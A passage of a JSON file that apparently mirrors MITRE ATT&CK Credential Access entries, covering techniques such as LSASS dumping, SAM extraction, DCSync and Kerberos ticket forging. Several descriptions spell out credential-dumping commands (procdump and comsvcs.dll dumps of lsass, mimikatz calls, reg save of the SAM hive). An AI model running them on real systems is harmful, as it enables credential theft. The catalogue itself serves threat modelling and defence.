    "parent_technique": "Input Capture",
    "parent_technique_id": "T1056",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:15:42.057074"
  },
  {
    "technique_id": "T1056.003",
    "name": "Web Portal Capture",
    "description": "Adversaries may install code on externally facing portals, such as a VPN login page, to capture and transmit credentials of users who attempt to log into the service. For example, a compromised login page may log provided user credentials before logging the user in to the service.This variation on input capture may be conducted post-compromise using legitimate administrative access as a backup measure to maintain network access throughExternal Remote ServicesandValid Accountsor as part of the initial compromise by exploitation of the externally facing web service.[1]",
    "tactic": "Credential Access",
    "tactics": [
      "Credential Access"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Input Capture",
    "parent_technique_id": "T1056",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:15:45.402574"
  },
  {
    "technique_id": "T1056.004",
    "name": "Credential API Hooking",
    "description": "Adversaries may hook into Windows application programming interface (API) functions and Linux system functions to collect user credentials. Malicious hooking mechanisms may capture API or function calls that include parameters that reveal user authentication credentials.[1]UnlikeKeylogging, this technique focuses specifically on API functions that include parameters that reveal user credentials.In Windows, hooking involves redirecting calls to these functions and can be implemented via:Hooks procedures, which intercept and execute designated code in response to events such as messages, keystrokes, and mouse inputs.[2][3]Import address table (IAT) hooking, which use modifications to a processâ€™s IAT, where pointers to imported API functions are stored.[3][4][5]Inline hooking, which overwrites the first bytes in an API function to redirect code flow.[3][6][5]In Linux and macOS, adversaries may hook into system functions via theLD_PRELOAD(Linux) orDYLD_INSERT_LIBRARIES(macOS) environment variables, which enables loading shared libraries into a programâ€™s address space. For example, an adversary may capture credentials by hooking into thelibc readfunction leveraged by SSH or SCP.[7]",
    "tactic": "Credential Access",
    "tactics": [
      "Credential Access"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Input Capture",
    "parent_technique_id": "T1056",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:15:48.780795"
  },
  {
    "technique_id": "T1556",
    "name": "Modify Authentication Process",
    "description": "Adversaries may modify authentication mechanisms and processes to access user credentials or enable otherwise unwarranted access to accounts. The authentication process is handled by mechanisms, such as the Local Security Authentication Server (LSASS) process and the Security Accounts Manager (SAM) on Windows, pluggable authentication modules (PAM) on Unix-based systems, and authorization plugins on MacOS systems, responsible for gathering, storing, and validating credentials. By modifying an authentication process, an adversary may be able to authenticate to a service or system without usingValid Accounts.Adversaries may maliciously modify a part of this process to either reveal credentials or bypass authentication mechanisms. Compromised credentials or access may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access and remote desktop.",
    "tactic": "Credential Access",
    "tactics": [
      "Credential Access"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:15:52.591502",
    "subtechniques": [
      {
        "id": "T1556.001",
        "name": "Domain Controller Authentication"
      },
      {
        "id": "T1556.002",
        "name": "Password Filter DLL"
      },
      {
        "id": "T1556.005",
        "name": "Reversible Encryption"
      },
      {
        "id": "T1556.006",
        "name": "Multi-Factor Authentication"
      },
      {
        "id": "T1556.007",
        "name": "Hybrid Identity"
      },
      {
        "id": "T1556.008",
        "name": "Network Provider DLL"
      }
    ]
  },
  {
    "technique_id": "T1556.001",
    "name": "Domain Controller Authentication",
    "description": "Adversaries may patch the authentication process on a domain controller to bypass the typical authentication mechanisms and enable access to accounts.Malware may be used to inject false credentials into the authentication process on a domain controller with the intent of creating a backdoor used to access any userâ€™s account and/or credentials (ex:Skeleton Key). Skeleton key works through a patch on an enterprise domain controller authentication process (LSASS) with credentials that adversaries may use to bypass the standard authentication system. Once patched, an adversary can use the injected password to successfully authenticate as any domain user account (until the the skeleton key is erased from memory by a reboot of the domain controller). Authenticated access may enable unfettered access to hosts and/or resources within single-factor authentication environments.[1]",
    "tactic": "Credential Access",
    "tactics": [
      "Credential Access"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Modify Authentication Process",
    "parent_technique_id": "T1556",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:15:55.865742"
  },
  {
    "technique_id": "T1556.002",
    "name": "Password Filter DLL",
    "description": "Adversaries may register malicious password filter dynamic link libraries (DLLs) into the authentication process to acquire user credentials as they are validated.Windows password filters are password policy enforcement mechanisms for both domain and local accounts. Filters are implemented as DLLs containing a method to validate potential passwords against password policies. Filter DLLs can be positioned on local computers for local accounts and/or domain controllers for domain accounts. Before registering new passwords in the Security Accounts Manager (SAM), the Local Security Authority (LSA) requests validation from each registered filter. Any potential changes cannot take effect until every registered filter acknowledges validation.Adversaries can register malicious password filters to harvest credentials from local computers and/or entire domains. To perform proper validation, filters must receive plain-text credentials from the LSA. A malicious password filter would receive these plain-text credentials every time a password request is made.[1]",
    "tactic": "Credential Access",
    "tactics": [
      "Credential Access"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Modify Authentication Process",
    "parent_technique_id": "T1556",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:15:59.245513"
  },
  {
    "technique_id": "T1556.005",
    "name": "Reversible Encryption",
    "description": "An adversary may abuse Active Directory authentication encryption properties to gain access to credentials on Windows systems. TheAllowReversiblePasswordEncryptionproperty specifies whether reversible password encryption for an account is enabled or disabled. By default this property is disabled (instead storing user credentials as the output of one-way hashing functions) and should not be enabled unless legacy or other software require it.[1]If the property is enabled and/or a user changes their password after it is enabled, an adversary may be able to obtain the plaintext of passwords created/changed after the property was enabled. To decrypt the passwords, an adversary needs four components:Encrypted password (G$RADIUSCHAP) from the Active Directory user-structureuserParameters16 byte randomly-generated value (G$RADIUSCHAPKEY) also fromuserParametersGlobal LSA secret (G$MSRADIUSCHAPKEY)Static key hardcoded in the Remote Access Subauthentication DLL (RASSFM.DLL)With this information, an adversary may be able to reproduce the encryption key and subsequently decrypt the encrypted password value.[2][3]An adversary may set this property at various scopes through Local Group Policy Editor, user properties, Fine-Grained Password Policy (FGPP), or via the ActiveDirectoryPowerShellmodule. For example, an adversary may implement and apply a FGPP to users or groups if the Domain Functional Level is set to \"Windows Server 2008\" or higher.[4]In PowerShell, an adversary may make associated changes to user settings using commands similar toSet-ADUser -AllowReversiblePasswordEncryption $true.",
    "tactic": "Credential Access",
    "tactics": [
      "Credential Access"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Modify Authentication Process",
    "parent_technique_id": "T1556",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:16:02.619491"
  },
  {
    "technique_id": "T1556.006",
    "name": "Multi-Factor Authentication",
    "description": "Adversaries may disable or modify multi-factor authentication (MFA) mechanisms to enable persistent access to compromised accounts.Once adversaries have gained access to a network by either compromising an account lacking MFA or by employing an MFA bypass method such asMulti-Factor Authentication Request Generation, adversaries may leverage their access to modify or completely disable MFA defenses. This can be accomplished by abusing legitimate features, such as excluding users from Azure AD Conditional Access Policies, registering a new yet vulnerable/adversary-controlled MFA method, or by manually patching MFA programs and configuration files to bypass expected functionality.[1][2]For example, modifying the Windows hosts file (C:\\windows\\system32\\drivers\\etc\\hosts) to redirect MFA calls to localhost instead of an MFA server may cause the MFA process to fail. If a \"fail open\" policy is in place, any otherwise successful authentication attempt may be granted access without enforcing MFA.[3]Depending on the scope, goals, and privileges of the adversary, MFA defenses may be disabled for individual accounts or for all accounts tied to a larger group, such as all domain accounts in a victim's network environment.[3]",
    "tactic": "Credential Access",
    "tactics": [
      "Credential Access"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Modify Authentication Process",
    "parent_technique_id": "T1556",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:16:05.963421"
  },
  {
    "technique_id": "T1556.007",
    "name": "Hybrid Identity",
    "description": "Adversaries may patch, modify, or otherwise backdoor cloud authentication processes that are tied to on-premises user identities in order to bypass typical authentication mechanisms, access credentials, and enable persistent access to accounts.Many organizations maintain hybrid user and device identities that are shared between on-premises and cloud-based environments. These can be maintained in a number of ways. For example, Microsoft Entra ID includes three options for synchronizing identities between Active Directory and Entra ID[1]:Password Hash Synchronization (PHS), in which a privileged on-premises account synchronizes user password hashes between Active Directory and Entra ID, allowing authentication to Entra ID to take place entirely in the cloudPass Through Authentication (PTA), in which Entra ID authentication attempts are forwarded to an on-premises PTA agent, which validates the credentials against Active DirectoryActive Directory Federation Services (AD FS), in which a trust relationship is established between Active Directory and Entra IDAD FS can also be used with other SaaS and cloud platforms such as AWS and GCP, which will hand off the authentication process to AD FS and receive a token containing the hybrid usersâ€™ identity and privileges.By modifying authentication processes tied to hybrid identities, an adversary may be able to establish persistent privileged access to cloud resources. For example, adversaries who compromise an on-premises server running a PTA agent may inject a malicious DLL into theAzureADConnectAuthenticationAgentServiceprocess that authorizes all attempts to authenticate to Entra ID, as well as records user credentials.[2][3]In environments using AD FS, an adversary may edit theMicrosoft.IdentityServer.Servicehostconfiguration file to load a malicious DLL that generates authentication tokens for any user with any set of claims, thereby bypassing multi-factor authentication and defined AD FS policies.[4]In some cases, adversaries may be able to modify the hybrid identity authentication process from the cloud. For example, adversaries who compromise a Global Administrator account in an Entra ID tenant may be able to register a new PTA agent via the web console, similarly allowing them to harvest credentials and log into the Entra ID environment as any user.[5]",
    "tactic": "Credential Access",
    "tactics": [
      "Credential Access"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Modify Authentication Process",
    "parent_technique_id": "T1556",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:16:09.220872"
  },
  {
    "technique_id": "T1556.008",
    "name": "Network Provider DLL",
    "description": "Adversaries may register malicious network provider dynamic link libraries (DLLs) to capture cleartext user credentials during the authentication process. Network provider DLLs allow Windows to interface with specific network protocols and can also support add-on credential management functions.[1]During the logon process, Winlogon (the interactive logon module) sends credentials to the localmpnotify.exeprocess via RPC. Thempnotify.exeprocess then shares the credentials in cleartext with registered credential managers when notifying that a logon event is happening.[2][3][4]Adversaries can configure a malicious network provider DLL to receive credentials frommpnotify.exe.[5]Once installed as a credential manager (via the Registry), a malicious DLL can receive and save credentials each time a user logs onto a Windows workstation or domain via theNPLogonNotify()function.[4]Adversaries may target planting malicious network provider DLLs on systems known to have increased logon activity and/or administrator logon activity, such as servers and domain controllers.[2]",
    "tactic": "Credential Access",
    "tactics": [
      "Credential Access"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Modify Authentication Process",
    "parent_technique_id": "T1556",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:16:12.571520"
  },
  {
    "technique_id": "T1111",
    "name": "Multi-Factor Authentication Interception",
    "description": "Adversaries may target multi-factor authentication (MFA) mechanisms, (i.e., smart cards, token generators, etc.) to gain access to credentials that can be used to access systems, services, and network resources. Use of MFA is recommended and provides a higher level of security than usernames and passwords alone, but organizations should be aware of techniques that could be used to intercept and bypass these security mechanisms.If a smart card is used for multi-factor authentication, then a keylogger will need to be used to obtain the password associated with a smart card during normal use. With both an inserted card and access to the smart card password, an adversary can connect to a network resource using the infected system to proxy the authentication with the inserted hardware token.[1]Adversaries may also employ a keylogger to similarly target other hardware tokens, such as RSA SecurID. Capturing token input (including a user's personal identification code) may provide temporary access (i.e. replay the one-time passcode until the next value rollover) as well as possibly enabling adversaries to reliably predict future authentication values (given access to both the algorithm and any seed values used to generate appended temporary codes).[2]Other methods of MFA may be intercepted and used by an adversary to authenticate. It is common for one-time codes to be sent via out-of-band communications (email, SMS). If the device and/or service is not secured, then it may be vulnerable to interception. Service providers can also be targeted: for example, an adversary may compromise an SMS messaging service in order to steal MFA codes sent to usersâ€™ phones.[3]",
    "tactic": "Credential Access",
    "tactics": [
      "Credential Access"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:16:15.923584",
    "subtechniques": []
  },
  {
    "technique_id": "T1621",
    "name": "Multi-Factor Authentication Request Generation",
    "description": "Adversaries may attempt to bypass multi-factor authentication (MFA) mechanisms and gain access to accounts by generating MFA requests sent to users.Adversaries in possession of credentials toValid Accountsmay be unable to complete the login process if they lack access to the 2FA or MFA mechanisms required as an additional credential and security control. To circumvent this, adversaries may abuse the automatic generation of push notifications to MFA services such as Duo Push, Microsoft Authenticator, Okta, or similar services to have the user grant access to their account. If adversaries lack credentials to victim accounts, they may also abuse automatic push notification generation when this option is configured for self-service password reset (SSPR).[1]In some cases, adversaries may continuously repeat login attempts in order to bombard users with MFA push notifications, SMS messages, and phone calls, potentially resulting in the user finally accepting the authentication request in response to \"MFA fatigue.\"[2][3][4]",
    "tactic": "Credential Access",
    "tactics": [
      "Credential Access"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:16:19.288824",
    "subtechniques": []
  },
  {
    "technique_id": "T1040",
    "name": "Network Sniffing",
    "description": "Adversaries may passively sniff network traffic to capture information about an environment, including authentication material passed over the network. Network sniffing refers to using the network interface on a system to monitor or capture information sent over a wired or wireless connection. An adversary may place a network interface into promiscuous mode to passively access data in transit over the network, or use span ports to capture a larger amount of data.Data captured via this technique may include user credentials, especially those sent over an insecure, unencrypted protocol. Techniques for name service resolution poisoning, such asLLMNR/NBT-NS Poisoning and SMB Relay, can also be used to capture credentials to websites, proxies, and internal systems by redirecting traffic to an adversary.Network sniffing may reveal configuration details, such as running services, version numbers, and other network characteristics (e.g. IP addresses, hostnames, VLAN IDs) necessary for subsequentLateral Movementand/orDefense Evasionactivities. Adversaries may likely also utilize network sniffing duringAdversary-in-the-Middle(AiTM) to passively gain additional knowledge about the environment.In cloud-based environments, adversaries may still be able to use traffic mirroring services to sniff network traffic from virtual machines. For example, AWS Traffic Mirroring, GCP Packet Mirroring, and Azure vTap allow users to define specified instances to collect traffic from and specified targets to send collected traffic to.[1][2][3]Often, much of this traffic will be in cleartext due to the use of TLS termination at the load balancer level to reduce the strain of encrypting and decrypting traffic.[4][5]The adversary can then use exfiltration techniques such as Transfer Data to Cloud Account in order to access the sniffed traffic.[4]On network devices, adversaries may perform network captures usingNetwork Device CLIcommands such asmonitor capture.[6][7]",
    "tactic": "Credential Access",
    "tactics": [
      "Credential Access"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:16:22.644960",
    "subtechniques": []
  },
  {
    "technique_id": "T1003",
    "name": "OS Credential Dumping",
    "description": "Adversaries may attempt to dump credentials to obtain account login and credential material, normally in the form of a hash or a clear text password. Credentials can be obtained from OS caches, memory, or structures.[1]Credentials can then be used to performLateral Movementand access restricted information.Several of the tools mentioned in associated sub-techniques may be used by both adversaries and professional security testers. Additional custom tools likely exist as well.",
    "tactic": "Credential Access",
    "tactics": [
      "Credential Access"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:16:26.071066",
    "subtechniques": [
      {
        "id": "T1003.001",
        "name": "LSASS Memory"
      },
      {
        "id": "T1003.002",
        "name": "Security Account Manager"
      },
      {
        "id": "T1003.003",
        "name": "NTDS"
      },
      {
        "id": "T1003.004",
        "name": "LSA Secrets"
      },
      {
        "id": "T1003.005",
        "name": "Cached Domain Credentials"
      },
      {
        "id": "T1003.006",
        "name": "DCSync"
      }
    ]
  },
  {
    "technique_id": "T1003.001",
    "name": "LSASS Memory",
    "description": "Adversaries may attempt to access credential material stored in the process memory of the Local Security Authority Subsystem Service (LSASS). After a user logs on, the system generates and stores a variety of credential materials in LSASS process memory. These credential materials can be harvested by an administrative user or SYSTEM and used to conductLateral MovementusingUse Alternate Authentication Material.As well as in-memory techniques, the LSASS process memory can be dumped from the target host and analyzed on a local system.For example, on the target host use procdump:procdump -ma lsass.exe lsass_dumpLocally, mimikatz can be run using:sekurlsa::Minidump lsassdump.dmpsekurlsa::logonPasswordsBuilt-in Windows tools such ascomsvcs.dllcan also be used:rundll32.exe C:\\Windows\\System32\\comsvcs.dll MiniDump PID  lsass.dmp full[1][2]Similar toImage File Execution Options Injection, the silent process exit mechanism can be abused to create a memory dump oflsass.exethrough Windows Error Reporting (WerFault.exe).[3]Windows Security Support Provider (SSP) DLLs are loaded into LSASS process at system start. Once loaded into the LSA, SSP DLLs have access to encrypted and plaintext passwords that are stored in Windows, such as any logged-on user's Domain password or smart card PINs. The SSP configuration is stored in two Registry keys:HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Security PackagesandHKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\OSConfig\\Security Packages. An adversary may modify these Registry keys to add new SSPs, which will be loaded the next time the system boots, or when the AddSecurityPackage Windows API function is called.[4]The following SSPs can be used to access credentials:Msv: Interactive logons, batch logons, and service logons are done through the MSV authentication package.Wdigest: The Digest Authentication protocol is designed for use with Hypertext Transfer Protocol (HTTP) and Simple Authentication Security Layer (SASL) exchanges.[5]Kerberos: Preferred for mutual client-server domain authentication in Windows 2000 and later.CredSSP:  Provides SSO and Network Level Authentication for Remote Desktop Services.[5]",
    "tactic": "Credential Access",
    "tactics": [
      "Credential Access"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "OS Credential Dumping",
    "parent_technique_id": "T1003",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:16:29.502197"
  },
  {
    "technique_id": "T1003.002",
    "name": "Security Account Manager",
    "description": "Adversaries may attempt to extract credential material from the Security Account Manager (SAM) database either through in-memory techniques or through the Windows Registry where the SAM database is stored. The SAM is a database file that contains local accounts for the host, typically those found with thenet usercommand. Enumerating the SAM database requires SYSTEM level access.A number of tools can be used to retrieve the SAM file through in-memory techniques:pwdumpx.exegsecdumpMimikatzsecretsdump.pyAlternatively, the SAM can be extracted from the Registry with Reg:reg save HKLM\\sam samreg save HKLM\\system systemCreddump7 can then be used to process the SAM database locally to retrieve hashes.[1]Notes:RID 500 account is the local, built-in administrator.RID 501 is the guest account.User accounts start with a RID of 1,000+.",
    "tactic": "Credential Access",
    "tactics": [
      "Credential Access"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "OS Credential Dumping",
    "parent_technique_id": "T1003",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:16:32.881262"
  },
  {
    "technique_id": "T1003.003",
    "name": "NTDS",
    "description": "Adversaries may attempt to access or create a copy of the Active Directory domain database in order to steal credential information, as well as obtain other information about domain members such as devices, users, and access rights. By default, the NTDS file (NTDS.dit) is located in%SystemRoot%\\NTDS\\Ntds.ditof a domain controller.[1]In addition to looking for NTDS files on active Domain Controllers, adversaries may search for backups that contain the same or similar information.[2]The following tools and techniques can be used to enumerate the NTDS file and the contents of the entire Active Directory hashes.Volume Shadow Copysecretsdump.pyUsing the in-built Windows tool, ntdsutil.exeInvoke-NinjaCopy",
    "tactic": "Credential Access",
    "tactics": [
      "Credential Access"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "OS Credential Dumping",
    "parent_technique_id": "T1003",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:16:36.300264"
  },
  {
    "technique_id": "T1003.004",
    "name": "LSA Secrets",
    "description": "Adversaries with SYSTEM access to a host may attempt to access Local Security Authority (LSA) secrets, which can contain a variety of different credential materials, such as credentials for service accounts.[1][2][3]LSA secrets are stored in the registry atHKEY_LOCAL_MACHINE\\SECURITY\\Policy\\Secrets. LSA secrets can also be dumped from memory.[4]Regcan be used to extract from the Registry.Mimikatzcan be used to extract secrets from memory.[4]",
    "tactic": "Credential Access",
    "tactics": [
      "Credential Access"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "OS Credential Dumping",
    "parent_technique_id": "T1003",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:16:39.680474"
  },
  {
    "technique_id": "T1003.005",
    "name": "Cached Domain Credentials",
    "description": "Adversaries may attempt to access cached domain credentials used to allow authentication to occur in the event a domain controller is unavailable.[1]On Windows Vista and newer, the hash format is DCC2 (Domain Cached Credentials version 2) hash, also known as MS-Cache v2 hash.[2]The number of default cached credentials varies and can be altered per system. This hash does not allow pass-the-hash style attacks, and instead requiresPassword Crackingto recover the plaintext password.[3]On Linux systems, Active Directory credentials can be accessed through caches maintained by software like System Security Services Daemon (SSSD) or Quest Authentication Services (formerly VAS). Cached credential hashes are typically located at/var/lib/sss/db/cache.[domain].ldbfor SSSD or/var/opt/quest/vas/authcache/vas_auth.vdbfor Quest. Adversaries can use utilities, such astdbdump, on these database files to dump the cached hashes and usePassword Crackingto obtain the plaintext password.[4]With SYSTEM or sudo access, the tools/utilities such asMimikatz,Reg, and secretsdump.py for Windows or Linikatz for Linux can be used to extract the cached credentials.[4]Note: Cached credentials for Windows Vista are derived using PBKDF2.[2]",
    "tactic": "Credential Access",
    "tactics": [
      "Credential Access"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "OS Credential Dumping",
    "parent_technique_id": "T1003",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:16:43.041047"
  },
  {
    "technique_id": "T1003.006",
    "name": "DCSync",
    "description": "Adversaries may attempt to access credentials and other sensitive information by abusing a Windows Domain Controller's application programming interface (API)[1][2][3][4]to simulate the replication process from a remote domain controller using a technique called DCSync.Members of the Administrators, Domain Admins, and Enterprise Admin groups or computer accounts on the domain controller are able to run DCSync to pull password data[5]from Active Directory, which may include current and historical hashes of potentially useful accounts such as KRBTGT and Administrators. The hashes can then in turn be used to create aGolden Ticketfor use inPass the Ticket[6]or change an account's password as noted inAccount Manipulation.[7]DCSync functionality has been included in the \"lsadump\" module inMimikatz.[8]Lsadump also includes NetSync, which performs DCSync over a legacy replication protocol.[9]",
    "tactic": "Credential Access",
    "tactics": [
      "Credential Access"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "OS Credential Dumping",
    "parent_technique_id": "T1003",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:16:46.388557"
  },
  {
    "technique_id": "T1649",
    "name": "Steal or Forge Authentication Certificates",
    "description": "Adversaries may steal or forge certificates used for authentication to access remote systems or resources. Digital certificates are often used to sign and encrypt messages and/or files. Certificates are also used as authentication material. For example, Entra ID device certificates and Active Directory Certificate Services (AD CS) certificates bind to an identity and can be used as credentials for domain accounts.[1][2]Authentication certificates can be both stolen and forged. For example, AD CS certificates can be stolen from encrypted storage (in the Registry or files)[3], misplaced certificate files (i.e.Unsecured Credentials), or directly from the Windows certificate store via various crypto APIs.[4][5][6]With appropriate enrollment rights, users and/or machines within a domain can also request and/or manually renew certificates from enterprise certificate authorities (CA). This enrollment process defines various settings and permissions associated with the certificate. Of note, the certificateâ€™s extended key usage (EKU) values define signing, encryption, and authentication use cases, while the certificateâ€™s subject alternative name (SAN) values define the certificate ownerâ€™s alternate names.[7]Abusing certificates for authentication credentials may enable other behaviors such asLateral Movement. Certificate-related misconfigurations may also enable opportunities forPrivilege Escalation, by way of allowing users to impersonate or assume privileged accounts or permissions via the identities (SANs) associated with a certificate. These abuses may also enablePersistencevia stealing or forging certificates that can be used asValid Accountsfor the duration of the certificate's validity, despite user password resets. Authentication certificates can also be stolen and forged for machine accounts.Adversaries who have access to root (or subordinate) CA certificate private keys (or mechanisms protecting/managing these keys) may also establishPersistenceby forging arbitrary authentication certificates for the victim domain (known as \"golden\" certificates).[7]Adversaries may also target certificates and related services in order to access other forms of credentials, such asGolden Ticketticket-granting tickets (TGT) or NTLM plaintext.[7]",
    "tactic": "Credential Access",
    "tactics": [
      "Credential Access"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:16:49.765747",
    "subtechniques": []
  },
  {
    "technique_id": "T1558",
    "name": "Steal or Forge Kerberos Tickets",
    "description": "Adversaries may attempt to subvert Kerberos authentication by stealing or forging Kerberos tickets to enablePass the Ticket. Kerberos is an authentication protocol widely used in modern Windows domain environments. In Kerberos environments, referred to as \"realms\", there are three basic participants: client, service, and Key Distribution Center (KDC).[1]Clients request access to a service and through the exchange of Kerberos tickets, originating from KDC, they are granted access after having successfully authenticated. The KDC is responsible for both authentication and ticket granting.  Adversaries may attempt to abuse Kerberos by stealing tickets or forging tickets to enable unauthorized access.On Windows, the built-inklistutility can be used to list and analyze cached Kerberos tickets.[2]",
    "tactic": "Credential Access",
    "tactics": [
      "Credential Access"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:16:53.122658",
    "subtechniques": [
      {
        "id": "T1558.001",
        "name": "Golden Ticket"
      },
      {
        "id": "T1558.002",
        "name": "Silver Ticket"
      },
      {
        "id": "T1558.003",
        "name": "Kerberoasting"
      },
      {
        "id": "T1558.004",
        "name": "AS-REP Roasting"
      }
    ]
  },
  {
    "technique_id": "T1558.001",
    "name": "Golden Ticket",
    "description": "Adversaries who have the KRBTGT account password hash may forge Kerberos ticket-granting tickets (TGT), also known as a golden ticket.[1]Golden tickets enable adversaries to generate authentication material for any account in Active Directory.[2]Using a golden ticket, adversaries are then able to request ticket granting service (TGS) tickets, which enable access to specific resources. Golden tickets require adversaries to interact with the Key Distribution Center (KDC) in order to obtain TGS.[3]The KDC service runs all on domain controllers that are part of an Active Directory domain. KRBTGT is the Kerberos Key Distribution Center (KDC) service account and is responsible for encrypting and signing all Kerberos tickets.[4]The KRBTGT password hash may be obtained usingOS Credential Dumpingand privileged access to a domain controller.",
    "tactic": "Credential Access",
    "tactics": [
      "Credential Access"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Steal or Forge Kerberos Tickets",
    "parent_technique_id": "T1558",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:16:56.590454"
  },
  {
    "technique_id": "T1558.002",
    "name": "Silver Ticket",
    "description": "Adversaries who have the password hash of a target service account (e.g. SharePoint, MSSQL) may forge Kerberos ticket granting service (TGS) tickets, also known as silver tickets. Kerberos TGS tickets are also known as service tickets.[1]Silver tickets are more limited in scope in than golden tickets in that they only enable adversaries to access a particular resource (e.g. MSSQL) and the system that hosts the resource; however, unlike golden tickets, adversaries with the ability to forge silver tickets are able to create TGS tickets without interacting with the Key Distribution Center (KDC), potentially making detection more difficult.[2]Password hashes for target services may be obtained usingOS Credential DumpingorKerberoasting.",
    "tactic": "Credential Access",
    "tactics": [
      "Credential Access"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Steal or Forge Kerberos Tickets",
    "parent_technique_id": "T1558",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:16:59.955963"
  },
  {
    "technique_id": "T1558.003",
    "name": "Kerberoasting",
    "description": "Adversaries may abuse a valid Kerberos ticket-granting ticket (TGT) or sniff network traffic to obtain a ticket-granting service (TGS) ticket that may be vulnerable toBrute Force.[1][2]Service principal names (SPNs) are used to uniquely identify each instance of a Windows service. To enable authentication, Kerberos requires that SPNs be associated with at least one service logon account (an account specifically tasked with running a service[3]).[4][5][6][7]Adversaries possessing a valid Kerberos ticket-granting ticket (TGT) may request one or more Kerberos ticket-granting service (TGS) service tickets for any SPN from a domain controller (DC).[1][2]Portions of these tickets may be encrypted with the RC4 algorithm, meaning the Kerberos 5 TGS-REP etype 23 hash of the service account associated with the SPN is used as the private key and is thus vulnerable to offlineBrute Forceattacks that may expose plaintext credentials.[2][1][7]This same behavior could be executed using service tickets captured from network traffic.[2]Cracked hashes may enablePersistence,Privilege Escalation, andLateral Movementvia access toValid Accounts.[6]",
    "tactic": "Credential Access",
    "tactics": [
      "Credential Access"
